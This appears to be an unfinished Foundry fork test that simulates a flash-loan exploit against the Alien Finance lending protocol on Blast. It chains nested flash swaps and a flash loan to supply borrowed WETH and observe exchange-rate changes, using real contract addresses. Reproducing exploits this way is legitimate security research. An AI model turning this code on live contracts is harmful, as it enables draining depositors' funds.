// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {console, Test} from "forge-std/Test.sol";
import "../test/interfaces/IERC20.sol";
import "../test/interfaces/IWETH.sol";
import "../test/interfaces/IERC3156FlashBorrower.sol";
import "../test/interfaces/IUni_Pair_V2.sol";

interface IAlienFinance {
    function supply(address from, address to, address market, uint256 amount) external;
    function borrow(address from, address to, address asset, uint256 amount) external;
    function redeem(address from, address to, address asset, uint256 amount) external;
    function repay(address from, address to, address asset, uint256 amount) external;
    function getExchangeRate(address market) external view returns (uint256);
    function getTotalCash(address market) external view returns (uint256);
}

interface IBlasterswapV2Callee {
    function blasterswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}
interface ILender {
    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool);
}

contract Allien_flashloanTest is IERC3156FlashBorrower, Test {
    IUni_Pair_V2 private pair = IUni_Pair_V2(0x12c69BFA3fb3CbA75a1DEFA6e976B87E233fc7df);
    IUni_Pair_V2 private bltpair = IUni_Pair_V2(0x3b5d3f610Cc3505f4701E9FB7D0F0C93b7713adD);
    ILender private lender = ILender(0x45cf520dB0598b8054796E3c772C46326fb19856);
    address private constant usbd = 0x4300000000000000000000000000000000000003;
    address private constant blast = 0xb1a5700fA2358173Fe465e6eA4Ff52E36e88E2ad;
    address private constant weth = 0x4300000000000000000000000000000000000004;
    IAlienFinance private Allien = IAlienFinance(0x02B7BF59e034529d90e2ae8F8d1699376Dd05ade);
    // IAToken public atoken = IAToken(0x6fF7A155557C4B516a062dFA65704b3158ea9ACf);
    address private attacker;

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/blast", 6210720);
        attacker = msg.sender;
        vm.deal(address(this), 100.1 ether);
        vm.prank(address(this));
        IWETH(0x4300000000000000000000000000000000000004).deposit{value: 50 ether}();
        deal(address(usbd), address(this), 100 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[After] Attacker blast before flashloan", IERC20(usbd).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[After] Attacker weth before flashloan", IERC20(weth).balanceOf(address(this)), 18);
        uint256 totoalcashforblast = Allien.getTotalCash(blast);
        uint256 totoalcashforweth = Allien.getTotalCash(weth);
        uint256 totoalcashforusbd = Allien.getTotalCash(usbd);
        emit log_named_decimal_uint("blast totoal cash before before flashloan",totoalcashforblast, 18);
        emit log_named_decimal_uint("weth totoal cash before before flashloan", totoalcashforweth, 18);
        emit log_named_decimal_uint("usbd totoal cash before before flashloan", totoalcashforusbd, 18);
        
        

        bytes memory data = abi.encode(weth, 900 * 10**18);
        pair.swap(0, 900 * 10**18, address(this), data);

        emit log_named_decimal_uint("Attacker usbd after flashloan", IERC20(usbd).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("Attacker weth after flashloan", IERC20(weth).balanceOf(address(this)), 18);
    
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        emit log_named_decimal_uint("Attacker weth during first flash", IERC20(weth).balanceOf(address(this)), 18);

        // FirstSupplyAndRedeem();

        bytes memory data2 = abi.encode(weth, 200 * 10**18);
        bltpair.swap(0, 200 * 10**18, address(this), data2);
     
    }

    function blasterswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data2) external {
        emit log_named_decimal_uint("Attacker usbd during second flash loan", IWETH(weth).balanceOf(address(this)), 18);
        uint256 wethdurinflash = IWETH(weth).balanceOf(address(Allien));
        emit log_named_decimal_uint("allien weth balance before flash", wethdurinflash, 18);
        uint256 exchangerate = Allien.getExchangeRate(weth);
        emit log_named_decimal_uint(" weth ecxchangerate before flash", exchangerate, 18);
        // getuserstatusbefore();
        // borrowblast();
        // getuserstatusbefore();
        // borrowweth();
        // getuserstatus();
        // // borrowmoreusbd();
        // // getuserstatus();

        // SecondSupplyAndRedeem();
        address token = address(weth);
        uint256 amount = 0.5 * 10**18;  // 250 USDB with 18 decimals

        lender.flashLoan(IERC3156FlashBorrower(address(this)), token, amount, "");
        

    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee3,
        bytes calldata data
    ) external override returns (bytes32) {
        require(address(_token) == address(weth), "Token mismatch");
        require(initiator == address(this), "Incorrect initiator");

        emit log_named_decimal_uint("Attacker weth during 3rd", IWETH(weth).balanceOf(address(this)), 18);

        uint256 wethdurinflash = IWETH(weth).balanceOf(address(Allien));
        emit log_named_decimal_uint("allien weth balance during flash", wethdurinflash, 18);

        uint256 totoalcashforblast = Allien.getTotalCash(blast);
        uint256 totoalcashforweth = Allien.getTotalCash(weth);
        uint256 totoalcashforusbd = Allien.getTotalCash(usbd);
        emit log_named_decimal_uint("blast totoal cash after flashloan",totoalcashforblast, 18);
        emit log_named_decimal_uint("weth totoal cash after flashloan", totoalcashforweth, 18);
        emit log_named_decimal_uint("usbd totoal cash after flashloan", totoalcashforusbd, 18);

        IWETH(weth).approve(address(Allien), IWETH(weth).balanceOf(address(this)));
        Allien.supply(address(this), address(this), address(weth), IWETH(weth).balanceOf(address(this)));
        
        uint256 exchangerate = Allien.getExchangeRate(weth);
        emit log_named_decimal_uint(" weth ecxchangerate after supply", exchangerate, 18);

        // uint256 afexchangerate = Allien.getExchangeRate(weth);
        // emit log_named_decimal_uint(" weth ecxchangerate after supply", afexchangerate, 18);
        uint256 aftotoalcashforweth = Allien.getTotalCash(weth);
        emit log_named_decimal_uint("weth totoal cash after flashloan", aftotoalcashforweth, 18);


        uint256 fee = (uint256(900 * 10**18) * 3) / 997 + 1;
        emit log_named_decimal_uint("fee to pay during ", fee, 18);
        uint256 amountToRepay = 900 * 10**18 + fee;
        emit log_named_decimal_uint("flash loan amount to repay", amountToRepay, 18);
        uint256 fee2 = (uint256(200 * 10**18) * 3) / 997 + 1;
        emit log_named_decimal_uint("fee2 to pay during ", fee2, 18);
        uint256 amountToRepay2 = 200 * 10**18 + fee2;
        emit log_named_decimal_uint("flash2 loan amount to repay", amountToRepay2, 18);
        // uint256 totalDebt = amount + (fee3);
        // emit log_named_decimal_uint("total debt allienflash", totalDebt, 18);

        // Ensure we have enough balance to repay the loan
        require(IWETH(weth).balanceOf(address(this)) >= amountToRepay, "Insufficient balance to repay the loan");
        require(IWETH(weth).balanceOf(address(this)) >= amountToRepay2, "Insufficient balance to repay the loan2");
        // require(weth.balanceOf(address(this)) >= totalDebt, "Insufficient balance to repay allien flash loan");
        // Repay the loan
        IWETH(weth).transfer(address(pair), amountToRepay);
        IWETH(weth).transfer(address(bltpair), amountToRepay2);
        // Approve the exact amount required for repayment
        require(IWETH(weth).approve(address(lender), IWETH(weth).balanceOf(address(this))), "Approval failed");
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}